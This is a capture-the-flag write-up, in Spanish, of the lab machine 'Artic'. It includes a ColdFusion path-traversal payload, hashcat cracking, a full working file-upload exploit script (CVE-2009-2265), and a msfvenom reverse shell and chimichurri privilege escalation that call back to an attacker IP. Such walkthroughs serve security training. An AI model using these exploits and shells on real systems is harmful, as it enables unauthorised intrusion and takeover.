#  ARTIC MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/1.png)

## INDEX

- [[#ESCANEO Y ENUMERACION|ESCANEO Y ENUMERACION]]
- [[#EXPLOTACION|EXPLOTACION]]
- [[#ELEVACION DE PRIVILEGIOS|ELEVACION DE PRIVILEGIOS]]


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 -v -n 10.10.10.11 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p -sV -sC 10.10.10.11 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/3.png)

## EXPLOTACION

Vemos que el puerto 8500 no pudo se ridentificado, pero si vemos si tiene algo en el navegador nos encontramos con un directory listing:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/4.png)

si vamos al enlace de CFIDE y despues Administrator nos sale un inicio de sesion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/5.png)

con la version vamos a buscar vulnerabilidades y encontramos  un LFI que nos muestra la contraseña cifrada del usuario administrador:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/6.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/7.png)

si vamos a esa ruta vemos unas credenciales cifradas:

```bash
?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/8.png)

con la herramienta **hash identifier** vamos a intentar descubribir que cifrado usa:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/9.png)

usa SHA1, intentemos un ataque de fuerza bruta con diccionario mediante hashcat para ver si encontramos:

```bash
hashcat -a 0 -m 100 hash.txt /usr/share/wordlist/rockyou.txt
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/10.png)

la contraseña es **happyday** vamos a iniciar sesion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/11.png)

encontre una POC de un file upload para adobe coldfusion 8 en el siguiente enlace [https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload](https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload)

```python
#!/usr/bin/python
# Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload
# Date: 2017-10-16
# Exploit Author: Alexander Reid
# Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html
# Version: ColdFusion 8.0.1
# CVE: CVE-2009-2265 
# 
# Description: 
# A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1
# Uploads the specified jsp file to the remote server.
#
# Usage: ./exploit.py <target ip> <target port> [/path/to/coldfusion] </path/to/payload.jsp>
# Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp
import requests, sys

try:
    ip = sys.argv[1]
    port = sys.argv[2]
    if len(sys.argv) == 5:
        path = sys.argv[3]
        with open(sys.argv[4], 'r') as payload:
            body=payload.read()
    else:
        path = ""
        with open(sys.argv[3], 'r') as payload:
            body=payload.read()
except IndexError:
    print 'Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/coldfusion] </path/to/payload.jsp>'
    print 'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'
    sys.exit(-1)

basepath = "http://" + ip + ":" + port + path

print 'Sending payload...'

try:
    req = requests.post(basepath + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/exploit.jsp%00", files={'newfile': ('exploit.txt', body, 'application/x-java-archive')}, timeout=30)
    if req.status_code == 200:
        print 'Successfully uploaded payload!\nFind it at ' + basepath + '/userfiles/file/exploit.jsp'
    else:
        print 'Failed to upload payload... ' + str(req.status_code) + ' ' + req.reason
except requests.Timeout:
    print 'Failed to upload payload... Request timed out'
```

lo descargamos y vamos a subir un jsp malicioso. ¿Por qué un JSP? pues buscando se descubrio que adobe interpreta java y la extension .jsp.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.16 LPORT=4242 -f raw > shell.jsp
```

ahora vamos a ejecutar el exploit:

```bash
python exploit.py 10.10.10.11 8500 shell.jsp
```

y nos indica que lo sube en la ruta: "http://10.10.10.11:8500/userfiles/file/"

si vamos a esa ruta en el navegador vemos la shell.jsp, nos colocamos a la escucha en netcat y lo ejecutamos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/12.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/13.png)

## ELEVACION DE PRIVILEGIOS

Viendo los permisos del usuario vemos que tiene el **SeImpersonatePrivilege** y esto lo podemos explotar con el** juicy potato**, ademas que el sistema operativo es antiguo y podemos usar **Chimichurri.exe**.

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/14.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/15.png)

Para realizar la elevacion de privilegios pueden ver como se lo hixo en la maquina **DEVEL** y se puede aplicar literalmente lo mismo.

Yo utilice chimichurri para hacerlo rapido:

```bash
chimichurri.exe 10.10.14.16 4545
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/ARTIC/images/16.png)